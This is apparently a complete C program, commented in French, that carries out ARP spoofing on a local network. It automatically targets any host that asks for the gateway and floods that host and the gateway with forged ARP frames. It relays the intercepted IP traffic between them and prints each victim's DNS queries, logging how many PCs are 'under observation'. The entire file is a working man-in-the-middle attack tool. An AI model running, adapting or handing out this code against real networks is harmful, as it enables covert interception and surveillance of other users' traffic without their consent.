#include <stdlib.h>
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <net/if.h>
#include <net/if_arp.h>
#include <linux/if_ether.h>
#include <net/ethernet.h>
#include <netpacket/packet.h>
#include <netinet/if_ether.h>
#include <netinet/ether.h>
#include <arpa/inet.h>
#include <string.h>
#include <pthread.h>
#include <time.h>
#include <unistd.h>
#include <netinet/udp.h>

#include "header/util.h"
#include "header/arp.h"
#include "header/ethernet.h"


#define WAIT_SPAM       3
#define BUFFER_LEN      128
#define BUFFER_RECV     1024
#define SYNTAXE         "Syntaxe : %s interface\n"


#define MAC_ATTAQUANT  "e0:94:67:b3:46:4c" // Mon mac
#define MAC_GATEWAY    "40:65:a3:e4:2c:76"
#define IP_ATTAQUANT   "192.168.43.29" // Mon ip
#define IP_GATEWAY     "192.168.43.1"

char *interface;
int   sockfd;

struct sockaddr_ll ethaddr;

struct pc { // Represente un terminal espionné
        pthread_t id;
        in_addr_t ip;
        struct ether_addr mac;
};

struct liste spoofed; // Liste des PC qu'on a eu

/* At exit */
void    sortie(void) { 
        liste_destroy(&spoofed);
        close(sockfd);
}

/**
 * Un thread par PC observé
 * On bourrine chaque cible de messages "@GW is at @monMAC"
 * On bourrine pour chaque cible la GW de messages "@CIBLE is at @monMAC"
 */
void    surveiller_pc(void *spc) {
        
        char buffer_cible[sizeof(struct ether_header) + sizeof(struct ether_arp)]; // Trame pour cible
        char buffer_gw[sizeof(struct ether_header) + sizeof(struct ether_arp)]; // Trame pour passerelle
        char buffer_read[BUFFER_LEN]; // Trame réponse cible
        
        struct pc        *cible = spc;
        struct ifreq     ifr;
        struct ether_arp *arp_cible = (struct ether_arp *)(buffer_cible + sizeof(struct ether_header));
        struct ether_arp *arp_gw = (struct ether_arp *)(buffer_gw + sizeof(struct ether_header));
        
        struct ether_header *eth_read = (struct ether_header *) buffer_read;
        
        struct timeval maxtime;
        maxtime.tv_sec = 1;
        maxtime.tv_usec = 0;
        
        int sockpc = socket_open_raw_packet(interface, &ifr, ETH_P_ARP);
        __C( setsockopt(sockpc, SOL_SOCKET, SO_RCVTIMEO, (struct timeval *)&maxtime, sizeof(struct timeval)),
                                        -1, "surveiller_pc: fail SO_RCVTIMEO ");
        
        time_t secs;
        int online = 1;
        int recu;
        
        
        // Construction fausse requete -> terminal cible
        ethernet_init(ETHERTYPE_ARP, buffer_cible);
        ethernet_set_asrc(MAC_ATTAQUANT, buffer_cible);
        ethernet_set_ndst(&cible->mac, buffer_cible);
        
        arp_init(ARPOP_REQUEST, arp_cible);
        arp_set_sender_amac(MAC_ATTAQUANT, arp_cible);
        arp_set_sender_aip(IP_GATEWAY, arp_cible);
        arp_set_target_nmac(&cible->mac, arp_cible);
        arp_set_target_nip(cible->ip, arp_cible);
                     
        // Construction fausse requete -> passerelle
        ethernet_init(ETHERTYPE_ARP, buffer_gw);
        ethernet_set_asrc(MAC_ATTAQUANT, buffer_gw);
        ethernet_set_adst(MAC_GATEWAY, buffer_gw);
        
        arp_init(ARPOP_REQUEST, arp_gw);
        arp_set_sender_amac(MAC_ATTAQUANT, arp_gw);
        arp_set_sender_nip(cible->ip, arp_gw);
        arp_set_target_amac(MAC_GATEWAY, arp_gw);
        arp_set_target_aip(IP_GATEWAY, arp_gw);
        
        
        // Bourriner
        while(online) {
                arp_set_whois(arp_gw);
                ethernet_send(sockpc, buffer_gw, sizeof(struct ether_header) + sizeof(struct ether_arp), &ethaddr);
                
                arp_set_isat(arp_gw);
                ethernet_send(sockpc, buffer_gw, sizeof(struct ether_header) + sizeof(struct ether_arp), &ethaddr);
                
                arp_set_isat(arp_cible);
                ethernet_send(sockpc, buffer_cible, sizeof(struct ether_header) + sizeof(struct ether_arp), &ethaddr);
                
                arp_set_whois(arp_cible);
                ethernet_send(sockpc, buffer_cible, sizeof(struct ether_header) + sizeof(struct ether_arp), &ethaddr);
                
                secs = time(NULL) + 5;
                online = 0;
                memset(eth_read, 0, sizeof(struct ether_header));
                while(secs > time(NULL) && !online) {
                        recu = recv(sockpc, buffer_read, BUFFER_LEN, 0);
                        if(recu <= 0) 
                                secs = 0;
                        else {
                                if(!memcmp(&cible->mac, eth_read->ether_shost, sizeof(struct ether_addr)))
                                        online = 1;
                        }
                }
                
                sleep(WAIT_SPAM);
        }
        printf("%s @%s off\n", ether_ntoa(&cible->mac), inet_ntoa(*(struct in_addr *)&cible->ip));
        liste_suppr_obj(spc, &spoofed);
        free(cible);
}

/* Ecoute de toutes les trames */
void    surveiller_arrivees() {

        /* Déclaration des variables */
        char buffer[BUFFER_RECV]; // Buffer reception des trames
        // Positionnement des structures par rapport à ce buffer
        struct ether_arp  *arp     = (struct ether_arp *) (buffer + sizeof(struct ether_header));
        struct ether_header *trame = (struct ether_header *) buffer;
        struct ip              *ip = (struct ip *) (buffer + sizeof(struct ether_header));
        struct udphdr         *udp = (struct udphdr *) (buffer + sizeof(struct ether_header) + sizeof(struct ip));
        char *dns_query = buffer + sizeof(struct ether_header) + sizeof(struct ip) + sizeof(struct udphdr) + 12; // 12 : DNS header len

        
        struct ether_addr mon_mac;
        struct ether_addr mac_dg;
        
        in_addr_t ip_gw;
        in_addr_t ip_moi;
        uint16_t type;
        int  recu;
        int i;
        int record_len;
        struct pc *cible, *cible_redir;
        
        /* Initialisation */
        ip_gw = inet_addr(IP_GATEWAY);
        ip_moi = inet_addr(IP_ATTAQUANT);
        
        maccpy(MAC_GATEWAY, &mac_dg);
        maccpy(MAC_ATTAQUANT, &mon_mac);

        /* En attente */
        while(1) {
                recu = recv(sockfd, buffer, BUFFER_RECV, 0);
                __C( recu, -1, "surveiller_arrivees: echec recv ");
                
                
                if(!memcmp(trame->ether_shost, &mon_mac, sizeof(struct ether_addr)))
                        continue; // La trame vient de moi-même
                
                type = ntohs(trame->ether_type);
                
                /***************************************************************
                ******************** Si c'est un paquet IP  ********************
                ****************************************************************/
                if(type == ETH_P_IP) {
                        if(*(in_addr_t *)&ip->ip_dst == ip_moi)
                                continue; // C'est un paquet IP pour moi 
                        if(*(in_addr_t *)&ip->ip_src == ip_moi)
                                continue; // C'est un paquet IP qui vient de moi 
                        if(*(in_addr_t *)&ip->ip_src == ip_gw)
                                continue; // C'est un paquet IP qui vient de la DG 
                        
                        
                        if(IPPROTO_UDP == ip->ip_p) {
                                /* On filtre les segements ayant un port dest DNS */
                                if(ntohs(udp->uh_dport) == 0x0035) {
                                        
                                        // Calcul de la taille de la query
                                        record_len = recu - (
                                                  sizeof(struct ether_header)
                                                  + sizeof(struct ip)
                                                  + sizeof(struct udphdr)
                                                  + 12 // Taille de l'entete DNS
                                                  + 2 // Deux dernier champs query
                                        );
                                        for(i = 0; i < record_len; i++)
                                                printf("%c",
                                                    dns_query[i] > 48 && dns_query[i] < 127 ?
                                                        dns_query[i] : '.'
                                                );
                                        printf("\n");
                                }
                        }
                        
                        /* Redirection des paquets IP de PC Cible -> Moi -> Passerelle */
                        if(liste_rechercher_obj(&ip->ip_src, sizeof(pthread_t), sizeof(in_addr_t), &spoofed)) {
                                memcpy(&trame->ether_dhost, &mac_dg, sizeof(struct ether_addr));
                                memcpy(&trame->ether_shost, &mon_mac, sizeof(struct ether_addr));
                                ethernet_send(sockfd, buffer, recu, &ethaddr);
                        }
                        /* Redirection des paquets IP de DG -> Moi -> Passerelle */
                        else if((cible_redir = liste_rechercher_obj(&ip->ip_dst,
                                               sizeof(pthread_t), sizeof(in_addr_t), &spoofed)))
                        {
                                memcpy(&trame->ether_dhost, &cible_redir->mac, sizeof(struct ether_addr));
                                memcpy(&trame->ether_shost, &mon_mac, sizeof(struct ether_addr));
                                ethernet_send(sockfd, buffer, recu, &ethaddr);
                        }
                }
                
                /***************************************************************
                ******************** Si c'est une trame ARP  *******************
                **** On cherche les trames de type "Who-is 192.168.0.0.1"  *****
                ****************************************************************/
                if(type == ETH_P_ARP) {
                
                        /****** Cas initéressants *****************************/
                        if(ntohs(arp->ea_hdr.ar_op) != ARPOP_REQUEST)
                                continue; // C'est pas un ARP REQUEST
                        
                        if(memcmp(arp->arp_tpa, &ip_gw, sizeof(in_addr_t))) 
                                continue; // C'est la passerelle qui parle
                        
                        if(liste_rechercher_obj(trame->ether_shost, sizeof(pthread_t) + sizeof(in_addr_t),
                                                                sizeof(struct ether_addr), &spoofed))
                                continue; // On s'en occupe déjà dans le thread
                        /******************************************************/
                        
                        /* Création nouvelle cible */
                        cible = NULL;
                        cible = (struct pc *)malloc(sizeof(struct pc));
                        __C(cible, NULL, "malloc struct pc fail ");
                        
                        memcpy(&cible->mac, trame->ether_shost, sizeof(struct ether_addr));
                        memcpy(&cible->ip, (in_addr_t *)&arp->arp_spa, sizeof(in_addr_t));
                        
                        /* Ajout dans la liste */
                        liste_insert(cible, &spoofed);
                        
                        /* On créé son thread */
                        if(pthread_create(&cible->id, 0, (void *)surveiller_pc, cible) != 0)
                                perror("Impossible de créer un thread ");
                        
                        /* On peut afficher le nombre de PC esponnés */
                        printf("%d pc en observation\n", liste_size(&spoofed));
                }
        }
}

int     main(int argc, char *argv[]) {
        if(argc < 2) {
                fprintf(stderr, SYNTAXE, *argv);
                print_if();
                return EXIT_FAILURE;
        }
        interface = argv[1];
        struct ifreq ifr;
        
        ethernet_sockaddr_init(&ethaddr, interface);
        sockfd = socket_open_raw_packet(interface, &ifr, ETH_P_ALL);
        
        atexit(sortie);
        
        liste_init(sizeof(struct pc), &spoofed);
        
        surveiller_arrivees();
        
        return 1;
}

